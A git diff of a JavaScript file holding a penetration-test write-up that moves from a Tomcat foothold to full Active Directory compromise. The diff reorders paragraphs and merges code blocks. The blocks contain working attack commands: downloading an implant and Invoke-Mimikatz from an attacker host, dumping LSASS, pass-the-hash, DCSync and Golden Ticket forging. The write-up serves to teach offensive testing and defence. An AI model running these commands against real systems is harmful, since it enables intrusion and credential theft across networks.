@@ -13769,9 +13769,11 @@ const writeups = [
       },
       {
         heading: "6. Post-Exploitation — Local Enumeration & Privilege Escalation",
+        paragraphs: [ ],
         paragraphs: [
           "Shell access as the tomcat service account is a start, but it's low-privilege and constrained. Before moving laterally, we need to understand the host: what's running, what credentials are cached, what misconfigurations exist, and whether we can escalate to root.",
           "LinPEAS is our first tool of choice for automated local enumeration. It scans for hundreds of common privilege escalation vectors and produces color-coded output that makes triage fast — red means near-certain PE path, yellow means investigate, green means probably fine. We pipe the output to a file and work through the findings methodically.",
+          "LinPEAS surfaces two critical findings. First, the /etc/shadow file is world-readable — a classic misconfiguration that exposes all local password hashes. Second, there's a cron job running as root every 5 minutes that executes /opt/scripts/backup.sh, and that script is writable by the tomcat group. We own the file.",
         ],
         codeBlock: {
           language: "bash",
@@ -13793,14 +13795,10 @@ const writeups = [
   # Credential hunting in config files
   grep -rn "password\\|passwd\\|secret\\|key\\|token" \\
     /etc/ /var/www/ /opt/ /home/ 2>/dev/null \\
-    | grep -v Binary | tee /tmp/cred_grep.txt`,
-        },
-        paragraphs: [
-          "LinPEAS surfaces two critical findings. First, the /etc/shadow file is world-readable — a classic misconfiguration that exposes all local password hashes. Second, there's a cron job running as root every 5 minutes that executes /opt/scripts/backup.sh, and that script is writable by the tomcat group. We own the file.",
-        ],
-        codeBlock: {
-          language: "bash",
-          code: `# Confirm we can write to the cron script
+    | grep -v Binary | tee /tmp/cred_grep.txt
+          
+          ================================
+          # Confirm we can write to the cron script
   ls -la /opt/scripts/backup.sh
   # -rwxrwxr-x 1 root tomcat 245 Mar 12 09:22 /opt/scripts/backup.sh
   
@@ -13819,16 +13817,13 @@ const writeups = [
   find /root /home -name "id_rsa" -o -name "*.pem" 2>/dev/null | xargs cat`,
         },
         imagePlaceholder: {
-          caption: "Fig 3: LinPEAS color-coded output — critical PE vectors highlighted in red/yellow. World-readable /etc/shadow and a writable root cron script both flagged with 99% confidence ratings.",
+          caption: "LinPEAS Post-Exploitation tool — Local Enumeration & Privilege Escalation",
           src: "https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/linPEAS/images/peass.png",
         },
       },
       {
         heading: "7. Pivoting — Moving Into the Internal Network",
-        paragraphs: [
-          "We now have root on an external-facing Linux server that turns out to be dual-homed: it has both a public interface (192.0.2.82) and an internal interface (10.10.50.12). This is our bridge into the internal network. We set up a SOCKS5 proxy tunnel through this host so all our tools can reach internal assets as if we were sitting on the LAN.",
-          "We use Chisel for tunneling because it runs over HTTP/HTTPS (which bypasses most perimeter firewall rules), ships as a single static binary, and is extremely fast to set up. The alternative is SSH dynamic port forwarding, but Chisel's reverse tunnel mode is cleaner when egress filtering is involved.",
-        ],
+        paragraphs: [ ],
         codeBlock: {
           language: "bash",
           code: `# Attacker: start Chisel in server mode, accepting reverse tunnels
@@ -13850,14 +13845,22 @@ const writeups = [
     10.10.1.10 -oN dc_ports.txt`,
         },
         paragraphs: [
+          "We now have root on an external-facing Linux server that turns out to be dual-homed: it has both a public interface (192.0.2.82) and an internal interface (10.10.50.12). This is our bridge into the internal network. We set up a SOCKS5 proxy tunnel through this host so all our tools can reach internal assets as if we were sitting on the LAN.",
+          "We use Chisel for tunneling because it runs over HTTP/HTTPS (which bypasses most perimeter firewall rules), ships as a single static binary, and is extremely fast to set up. The alternative is SSH dynamic port forwarding, but Chisel's reverse tunnel mode is cleaner when egress filtering is involved.",
           "The internal sweep reveals a rich environment: 47 live hosts across the 10.10.0.0/16 range, including what is clearly the domain controller at 10.10.1.10 (Kerberos on 88, LDAP on 389, SMB on 445). There are Windows workstations, a handful of Linux servers, and a VMware vCenter instance at 10.10.2.15. The attack surface just expanded dramatically.",
         ],
       },
       {
         heading: "8. Active Directory Enumeration",
+        paragraphs: [ ],
         paragraphs: [
           "Active Directory is the backbone of most Windows enterprise environments, and compromising it typically means game over. But first we need working domain credentials to enumerate it properly. We crack the shadow file we grabbed from the web server.",
+          "The deploy account is a low-privilege domain user, but that's enough to enumerate the entire AD structure. BloodHound ingests the data and renders the graph. Attack paths light up immediately: three Kerberoastable service accounts, a path to Domain Admin through an unconstrained delegation host, and a helpdesk user who is local admin on 23 workstations.",
         ],
+        imagePlaceholder: {
+          caption: "Active Directory Enumeration",
+          src: "https://unit42.paloaltonetworks.com/wp-content/uploads/2024/12/word-image-479961-137899-7.png",
+        },
         codeBlock: {
           language: "bash",
           code: `# Crack SHA-512 hashes from /etc/shadow with hashcat
@@ -13878,18 +13881,10 @@ const writeups = [
     -d targetcorp.local \\
     -dc 10.10.1.10 \\
     --zip -c All \\
-    -ns 10.10.1.10`,
-        },
-        paragraphs: [
-          "The deploy account is a low-privilege domain user, but that's enough to enumerate the entire AD structure. BloodHound ingests the data and renders the graph. Attack paths light up immediately: three Kerberoastable service accounts, a path to Domain Admin through an unconstrained delegation host, and a helpdesk user who is local admin on 23 workstations.",
-        ],
-        imagePlaceholder: {
-          caption: "Fig 4: BloodHound CE mapping Active Directory attack paths — nodes in red are Tier Zero assets (Domain Controllers, krbtgt), edges represent abusable relationships like GenericWrite, AdminTo, and HasSession",
-          src: "https://specterops.io/wp-content/uploads/sites/3/2024/01/1Fo_1HbrrWu3cw0VBUV3nNA.png",
-        },
-        codeBlock: {
-          language: "bash",
-          code: `# Enumerate AD objects in detail with ldapdomaindump
+    -ns 10.10.1.10
+          
+          =======================================
+          # Enumerate AD objects in detail with ldapdomaindump
   proxychains ldapdomaindump \\
     -u 'TARGETCORP\\deploy' -p 'Summer2024!' \\
     10.10.1.10 -o /tmp/ldapdump/
@@ -13905,10 +13900,7 @@ const writeups = [
       },
       {
         heading: "9. Kerberoasting — Extracting Service Account Tickets",
-        paragraphs: [
-          "Kerberoasting is one of the most reliably effective Active Directory attacks, and it's been public knowledge since 2014. The premise: any domain user can request a Kerberos service ticket (TGS) for any account with a registered Service Principal Name. Those tickets are encrypted with the account's NTLM hash, which we can take offline and crack.",
-          "BloodHound flagged three Kerberoastable accounts: svc_sql, svc_backup, and svc_mssql. We request all their tickets in a single shot.",
-        ],
+        paragraphs: [ ],
         codeBlock: {
           language: "bash",
           code: `# Request TGS tickets for all Kerberoastable accounts in one go
@@ -13934,18 +13926,23 @@ const writeups = [
   # svc_sql:Sqlserver#1`,
         },
         paragraphs: [
+          "Kerberoasting is one of the most reliably effective Active Directory attacks, and it's been public knowledge since 2014. The premise: any domain user can request a Kerberos service ticket (TGS) for any account with a registered Service Principal Name. Those tickets are encrypted with the account's NTLM hash, which we can take offline and crack.",
+          "BloodHound flagged three Kerberoastable accounts: svc_sql, svc_backup, and svc_mssql. We request all their tickets in a single shot.",
           "Two out of three hashes crack in under 20 minutes on a GPU rig. svc_backup and svc_sql both have guessable passwords — dictionary words with a number and a special character, exactly the kind of thing passes a complexity requirement but falls to wordlist + rules. svc_mssql doesn't crack with our wordlist so we move on.",
           "svc_backup is especially interesting: BloodHound shows it has GenericWrite permissions over the helpdesk OU. But there's an even cleaner path available through the SQL server, so we follow that chain.",
         ],
         imagePlaceholder: {
-          caption: "Fig 5: Hashcat cracking Kerberoast hashes (mode 13100) — svc_backup falls in 4 minutes, svc_sql in 17. An RTX 4090 runs through roughly 1.8 billion RC4 candidates per second.",
-          src: "https://cybersecurity.bureauveritas.com/uploads/media/_fit1440x1000/19487/crack-ticket.webp",
+          caption: "Kerberoasting — Extracting Service Account Tickets",
+          src: "https://images.contentstack.io/v3/assets/blt53c99b43892c2378/blt5c7ce508c708d8eb/68c9a3bbbfa1b4767ba615ac/kerberos_vuln_assessments.jpg",
         },
       },
       {
         heading: "10. Lateral Movement — Spreading Across the Environment",
+        paragraphs: [ ],
         paragraphs: [
           "With svc_sql credentials, we have access to SQL Server instances in the environment. SQL Server is frequently over-privileged in enterprise environments — DBAs add sysadmin 'just in case' and it never gets revoked. We connect directly.",
+          "We now have a shell on the SQL server as svc_sql. We run Mimikatz in-memory to dump cached credentials — carefully, using the PowerShell-based Invoke-Mimikatz to avoid dropping a binary to disk where EDR might catch it.",
+          "The LSASS dump contains an NTLM hash for the IT Administrator account — cached from a previous login to this server. We don't need to crack it. We use it directly in a Pass-the-Hash attack.",
         ],
         codeBlock: {
           language: "bash",
@@ -13965,14 +13962,10 @@ const writeups = [
   
   # Stage a reverse shell payload via certutil (common LOLBin)
   EXEC xp_cmdshell 'certutil -urlcache -split -f http://10.10.10.5/implant.exe C:\\Windows\\Temp\\svc.exe';
-  EXEC xp_cmdshell 'C:\\Windows\\Temp\\svc.exe';`,
-        },
-        paragraphs: [
-          "We now have a shell on the SQL server as svc_sql. We run Mimikatz in-memory to dump cached credentials — carefully, using the PowerShell-based Invoke-Mimikatz to avoid dropping a binary to disk where EDR might catch it.",
-        ],
-        codeBlock: {
-          language: "powershell",
-          code: `# In-memory Mimikatz — nothing touches disk
+  EXEC xp_cmdshell 'C:\\Windows\\Temp\\svc.exe';
+
+===================================
+# In-memory Mimikatz — nothing touches disk
   $uri = "http://10.10.10.5/Invoke-Mimikatz.ps1"
   IEX (New-Object System.Net.WebClient).DownloadString($uri)
   
@@ -13984,14 +13977,10 @@ const writeups = [
   rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $proc.Id C:\Windows\Temp\lsass.dmp full
   
   # Analyze the dump offline with pypykatz
-  proxychains python3 pypykatz lsa minidump lsass.dmp`,
-        },
-        paragraphs: [
-          "The LSASS dump contains an NTLM hash for the IT Administrator account — cached from a previous login to this server. We don't need to crack it. We use it directly in a Pass-the-Hash attack.",
-        ],
-        codeBlock: {
-          language: "bash",
-          code: `# Pass-the-Hash — authenticate using the hash directly, no plaintext needed
+  proxychains python3 pypykatz lsa minidump lsass.dmp
+
+===================================
+          # Pass-the-Hash — authenticate using the hash directly, no plaintext needed
   proxychains python3 /opt/impacket/examples/psexec.py \\
     -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c \\
     TARGETCORP/ITAdmin@10.10.1.50 cmd.exe
@@ -14005,15 +13994,17 @@ const writeups = [
   # Hosts returning [+] Pwn3d! have local admin access`,
         },
         imagePlaceholder: {
-          caption: "Fig 6: CrackMapExec Pass-the-Hash sweep across the internal /24 — green 'Pwn3d!' rows indicate local admin access achieved. 31 of 47 hosts compromised in a single sweep.",
-          src: "https://miro.medium.com/v2/resize:fit:1400/1*-7jq9ZXmA6A32QAgUb8t1Q.png",
+          caption: "Lateral Movement — Spreading Across the Environment",
+          src: "https://cdn.prod.website-files.com/64e50cbe2b6f932c04238c14/69baac672ba6c7e44a6fd138_33fa9ec0.png",
         },
       },
       {
         heading: "11. Domain Admin — The Final Escalation",
+        paragraphs: [ ],
         paragraphs: [
           "We have local admin on 31 machines, but we need Domain Admin or direct DC access to call full compromise. BloodHound highlighted FILESRV01 as configured with Unconstrained Kerberos Delegation — the most dangerous delegation type.",
           "When Unconstrained Delegation is configured, any user that authenticates to that server has their TGT (master Kerberos ticket) cached in memory there. If we can coerce the Domain Controller itself to authenticate to FILESRV01, we capture the DC's TGT and can impersonate it — enabling a DCSync attack that dumps every password hash in the domain.",
+          "DCSync delivers the Domain Administrator's NTLM hash with no LSASS touching, no risky process injection — just a legitimate AD replication request made by what the DC believes is another DC. We have the keys.",
         ],
         codeBlock: {
           language: "bash",
@@ -14039,14 +14030,10 @@ const writeups = [
   proxychains python3 /opt/impacket/examples/secretsdump.py \\
     -k -no-pass \\
     TARGETCORP/DC01\\$@DC01.targetcorp.local \\
-    -dc-ip 10.10.1.10 -just-dc-user Administrator`,
-        },
-        paragraphs: [
-          "DCSync delivers the Domain Administrator's NTLM hash with no LSASS touching, no risky process injection — just a legitimate AD replication request made by what the DC believes is another DC. We have the keys.",
-        ],
-        codeBlock: {
-          language: "bash",
-          code: `# Full DCSync — dump every hash in the domain
+    -dc-ip 10.10.1.10 -just-dc-user Administrator
+
+          =============================================
+          # Full DCSync — dump every hash in the domain
   proxychains python3 /opt/impacket/examples/secretsdump.py \\
     -k -no-pass \\
     TARGETCORP/DC01\\$@DC01.targetcorp.local \\
@@ -14063,16 +14050,13 @@ const writeups = [
   TARGETCORP\\Domain Admins`,
         },
         imagePlaceholder: {
-          caption: "Fig 7: Impacket's secretsdump.py executing a DCSync attack — all domain hashes stream out including krbtgt and Administrator. Time from initial Tomcat shell to Domain Admin: 3 days, 6 hours.",
-          src: "https://www.bordergate.co.uk/wp-content/uploads/2019/03/impacket-secretsdump-ntds-ntds-dit-system-system.png",
+          caption: "Domain Admin — The Final Escalation",
+          src: "https://ptgmedia.pearsoncmg.com/images/chap1_9780135752036/elementLinks/F01XX01.jpg",
         },
       },
       {
         heading: "12. Persistence Simulation & Cleanup",
-        paragraphs: [
-          "In a full red team engagement we'd establish persistence to simulate long-term dwell time. In a pentest, we document what could be deployed and demonstrate one non-destructive example, then clean up thoroughly.",
-          "The most resilient persistence in an AD environment is a Golden Ticket: a forged Kerberos TGT signed with the KRBTGT account hash. Golden Tickets survive user password resets, remain valid for 10 years by default, and can be used to generate service tickets for any resource in the domain. The only remediation is resetting the KRBTGT password twice — which invalidates every Kerberos ticket in the domain and causes temporary service disruption.",
-        ],
+        paragraphs: [ ],
         codeBlock: {
           language: "bash",
           code: `# KRBTGT hash is already in our DCSync output
@@ -14105,6 +14089,8 @@ const writeups = [
   kill $(pgrep chisel)`,
         },
         paragraphs: [
+          "In a full red team engagement we'd establish persistence to simulate long-term dwell time. In a pentest, we document what could be deployed and demonstrate one non-destructive example, then clean up thoroughly.",
+          "The most resilient persistence in an AD environment is a Golden Ticket: a forged Kerberos TGT signed with the KRBTGT account hash. Golden Tickets survive user password resets, remain valid for 10 years by default, and can be used to generate service tickets for any resource in the domain. The only remediation is resetting the KRBTGT password twice — which invalidates every Kerberos ticket in the domain and causes temporary service disruption.",
           "Every artifact gets removed and documented. The client receives a full IOC list: file hashes, C2 addresses, registry keys modified, scheduled tasks added, and a precise timeline of every action taken. Their blue team uses this to verify cleanup and retroactively test their detection stack — figuring out which events they should have caught, and building better rules for next time.",
         ],
       },
@@ -14112,7 +14098,7 @@ const writeups = [
         heading: "13. Findings Summary & Severity Ratings",
         paragraphs: [
           "The engagement produced 23 distinct findings. The critical-severity items define the report's narrative: there was a clear, exploitable path from the public internet to full domain compromise, achievable in under a week by an attacker of moderate skill. The key findings are summarized below.",
-          "CRITICAL — Exposed Tomcat Manager with Default Credentials (CVSS 9.8): The Apache Tomcat management interface was internet-accessible and protected by default credentials alone. This provided unauthenticated remote code execution within minutes of discovery — the fastest initial access vector in the engagement.",
+          "*CRITICAL* — Exposed Tomcat Manager with Default Credentials (CVSS 9.8): The Apache Tomcat management interface was internet-accessible and protected by default credentials alone. This provided unauthenticated remote code execution within minutes of discovery — the fastest initial access vector in the engagement.",
           "CRITICAL — Unconstrained Kerberos Delegation Enabling Domain Compromise (CVSS 9.0): FILESRV01 was configured with Unconstrained Delegation. Combined with the MS-RPRN PrinterBug coercion technique, this allowed capture of the DC computer account's TGT and a subsequent DCSync that dumped every password hash in the domain.",
           "HIGH — Kerberoastable Service Accounts with Weak Passwords (CVSS 8.1): Three service accounts with SPNs registered were susceptible to offline TGS cracking. Two of the three had passwords that fell to standard wordlists in under 20 minutes.",
           "HIGH — Credentials and Infrastructure Details Exposed in Public GitHub (CVSS 7.5): A developer committed AWS credentials and internal configuration files — including VPN gateway hostnames and a dev team password pattern — to a public repository. The credentials were revoked but the topology data remained actionable.",
